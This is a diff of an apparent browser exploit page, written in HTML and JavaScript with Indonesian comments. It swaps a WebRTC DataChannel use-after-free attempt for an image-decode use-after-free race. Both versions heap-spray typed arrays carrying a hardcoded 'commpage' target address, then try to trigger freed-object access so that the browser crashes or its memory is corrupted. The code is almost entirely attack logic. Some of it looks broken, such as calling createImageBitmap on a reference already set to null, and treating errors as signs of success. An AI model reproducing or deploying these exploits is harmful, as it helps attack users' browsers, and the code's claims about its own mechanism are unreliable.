@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebRTC DataChannel Corruption Attack</title>
+    <title>Image Decode UAF Callback Attack</title>
 </head>
 <body>
 
-    <h1>WebRTC DataChannel Corruption (Commpage Target)</h1>
+    <h1>Image Decode UAF Callback (Stealth Attack)</h1>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Mempersiapkan Peer Connection...</p>
+    <p id="status">INIT: Mempersiapkan Image Decode Race...</p>
     <div id="log"></div>
 
     <script>
@@ -19,110 +19,84 @@
         const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
         const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);
 
-        let peerA = null;
-        let peerB = null;
-        let dataChannelA = null;
-        let sprayHolders = []; 
-        let attackInterval = null;
+        let imageList = [];
+        let payloadHolders = []; 
+        let currentImage = null;
 
         function log(message) {
-            document.getElementById('log').innerHTML += '<div>' + message + '</div>';
+            document.getElementById('log').innerHTML += `<div style="margin: 2px 0;">${message}</div>`;
         }
-
+        
         // --- FUNGSI HEAP SPRAY PAYLOAD ---
         function sprayPayload() {
-            const SPRAY_COUNT = 500;
+            // Menggunakan TypedArray untuk menargetkan pointer C++
+            const SPRAY_COUNT = 1000;
             const PAYLOAD_SIZE = 64; 
 
             for (let i = 0; i < SPRAY_COUNT; i++) {
                 let payloadArray = new Float64Array(PAYLOAD_SIZE);
                 payloadArray[0] = HIGH_WORD; 
                 payloadArray[1] = LOW_WORD;
-                payloadArray[2] = 2026.0 + i; 
-                sprayHolders.push(payloadArray); 
+                payloadArray[2] = 2027.0 + i; 
+                payloadHolders.push(payloadArray); 
             }
         }
 
         // --- FUNGSI UTAMA ATTACK ---
-        async function runWebRTCAttack() {
-            log("Phase 1: Membuat Peer A dan Peer B.");
-            
-            // Konfigurasi WebRTC
-            const config = { iceServers: [] }; 
-            peerA = new RTCPeerConnection(config);
-            peerB = new RTCPeerConnection(config);
+        async function runImageAttack() {
+            log("Phase 1: Menciptakan Elemen Gambar dan Data.");
 
-            // 2. DataChannel Setup (Korban)
-            dataChannelA = peerA.createDataChannel("exploit_channel");
+            // 1. Buat BLOB (Sumber gambar kecil yang valid)
+            const imageData = new Uint8Array([71, 73, 70, 56, 57, 97, 1, 0, 1, 0, 128, 0, 0, 0, 0, 0, 255, 255, 255, 33, 249, 4, 1, 0, 0, 0, 0, 44, 0, 0, 0, 0, 1, 0, 1, 0, 0, 2, 2, 76, 1, 0, 59]);
+            const blob = new Blob([imageData], { type: 'image/gif' });
+            const url = URL.createObjectURL(blob);
             
-            peerB.ondatachannel = function(event) {
-                const dataChannelB = event.channel;
-                dataChannelB.onmessage = function(e) {
-                    // Ketika B menerima pesan, B segera melakukan spray (UAF Race)
-                    if (e.data instanceof ArrayBuffer) {
-                        sprayPayload(); // Spray di thread penerima
-                        log("Spray dipicu oleh penerimaan data.");
-                    }
-                };
-            };
-            
-            // 3. ICE Exchange (Wajib untuk Koneksi)
-            peerA.onicecandidate = e => peerB.addIceCandidate(e.candidate).catch(() => {});
-            peerB.onicecandidate = e => peerA.addIceCandidate(e.candidate).catch(() => {});
+            currentImage = new Image();
+            currentImage.src = url;
 
-            // 4. Offer/Answer
-            const offer = await peerA.createOffer();
-            await peerA.setLocalDescription(offer);
-            await peerB.setRemoteDescription(peerA.localDescription);
-            const answer = await peerB.createAnswer();
-            await peerB.setLocalDescription(answer);
-            await peerA.setRemoteDescription(peerB.localDescription);
-            
-            log("Phase 2: Koneksi Peer dibuat. Menunggu DataChannel terbuka...");
+            log("Phase 2: Memulai Decode dan Memicu UAF Race...");
 
-            // 5. Memicu Serialization Corruption/UAF
-            dataChannelA.onopen = function() {
-                log("Phase 3: DataChannel terbuka. Memulai serangan...");
+            // 2. Memicu Decode Asynchronous (Memulai thread decode C++)
+            const decodePromise = currentImage.decode(); 
+
+            // 3. Memicu UAF Race
+            // Segera hapus elemen gambar di DOM dan referensi, tetapi janji (Promise) decode masih hidup!
+            currentImage.remove(); 
+            currentImage = null; 
+
+            // 4. Lakukan Spray Payload dengan Micro-Timing
+            // Tujuannya: Menimpa pointer callback C++ di tengah proses decode
+            setTimeout(sprayPayload, 0); 
+            log("Phase 3: Heap Spray dipicu setelah penghapusan referensi.");
+
+            // 5. Trigger Eksploitasi (Callback Execution)
+            // Tunggu Promise decode selesai. Jika decode berhasil, ia akan mencoba
+            // menjalankan callback pada elemen yang sudah di-free/ditimpa.
+            
+            try {
+                await decodePromise; 
+                log("Decode Promise berhasil diselesaikan. Menunggu Crash Implisit.");
                 
-                // Objek Biner Korban (Harus besar, DataChannel memecahnya)
-                const largeBuffer = new ArrayBuffer(5 * 1024 * 1024); // 5MB buffer
-                const victimView = new Uint32Array(largeBuffer);
-                victimView.fill(LOW_WORD); // Isi dengan nilai Commpage Target (LOW_WORD)
-                
-                // Interval serangan yang sangat cepat
-                attackInterval = setInterval(() => {
-                    if (dataChannelA.readyState === 'open') {
-                        dataChannelA.send(largeBuffer); // Kirim buffer besar berulang kali
-                        
-                        // Setelah mengirim, kita segera memutus koneksi secara acak (FREE/UAF)
-                        if (Math.random() < 0.1) { // 10% kemungkinan putus
-                            log("Trigger: Memutus Koneksi Secara Agresif.");
-                            peerA.close();
-                            peerB.close();
-                            clearInterval(attackInterval);
-                            
-                            // Trigger final dereference pada buffer yang mungkin sudah di-free/corrupt
-                            try {
-                                const finalCheck = victimView[0];
-                                let crashObj = {};
-                                crashObj[finalCheck] = 1; 
-                            } catch(e) {
-                                log("JS Error/Crash Trigger: " + e.message);
-                            }
-                        }
-                    }
-                }, 10); // Sangat cepat (10ms)
-            };
+                // Trigger tambahan: Coba akses DOM setelah decode
+                document.body.appendChild(document.createElement('div'));
+
+            } catch(e) {
+                // Jika promise gagal (misalnya karena UAF), ini adalah indikasi yang baik!
+                log("Decode Promise GAGAL (Sinyal UAF): " + e.message);
+            }
+            
+            // Trigger terakhir: Mencoba create ImageBitmap dari objek yang mungkin sudah di-free
+            try {
+                 const attackerBitmap = await createImageBitmap(currentImage);
+            } catch(e) {
+                 log("Bitmap creation failed (good sign).");
+            }
         }
         
         document.addEventListener('DOMContentLoaded', () => {
-             if (!window.RTCPeerConnection) {
-                 document.getElementById('status').textContent = 'Gagal: WebRTC tidak didukung.';
-                 return;
-             }
-             document.getElementById('status').textContent = 'Memulai rangkaian WebRTC Attack...';
-             setTimeout(runWebRTCAttack, 50);
-             document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Heap Corruption di WebRTC Process.';
+            document.getElementById('status').textContent = 'Memulai rangkaian Image Decode UAF...';
+            setTimeout(runImageAttack, 50);
+            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Crash Implisit.';
         });
 
     </script>
